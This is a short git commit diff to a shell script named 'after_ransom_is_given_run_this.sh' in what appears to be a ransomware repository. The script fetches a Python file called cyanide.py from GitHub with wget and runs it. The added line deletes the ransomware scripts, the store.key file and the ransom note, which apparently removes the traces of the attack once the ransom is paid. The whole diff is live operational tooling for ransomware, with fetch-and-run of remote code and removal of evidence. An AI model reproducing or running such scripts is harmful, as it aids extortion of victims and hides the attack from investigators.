29986f13c000dd5bc9bb4baf22b3ec96d0ae15f9
samsepi0lw <147035842+samsepi0lw@users.noreply.github.com>
2023-10-05 10:33:49 +0000

    Update after_ransom_is_given_run_this.sh

--- after_ransom_is_given_run_this.sh
+++ after_ransom_is_given_run_this.sh
@@ -2,3 +2,4 @@ wget https://github.com/samsepi0lw/ransom/blob/main/cyanide.py?raw=true
 mv cyanide.py\?raw=true cyanide.py
 #!/bin/bash
 python cyanide.py
+rm ./cyanide.py ./monsterwith23faces.py ./run_this.sh ./after_ransom_is_given_run_this.sh ./store.key ./ransom_note
